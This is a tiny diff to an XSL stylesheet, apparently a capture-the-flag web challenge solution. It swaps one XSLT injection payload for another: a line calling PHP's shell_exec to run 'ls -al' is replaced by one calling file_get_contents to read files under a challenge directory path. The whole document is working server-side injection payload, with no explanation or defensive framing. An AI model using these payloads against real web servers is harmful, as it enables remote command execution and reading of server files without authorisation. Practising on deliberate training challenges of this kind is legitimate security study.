@@ -4,6 +4,6 @@
 
    
     
-<xsl:value-of select="php:function('shell_exec','ls -al')" />
+<xsl:value-of select="php:function('file_get_contents','/challenge/web-serveur/ch50/*')" />
     </xsl:template>
 </xsl:stylesheet>
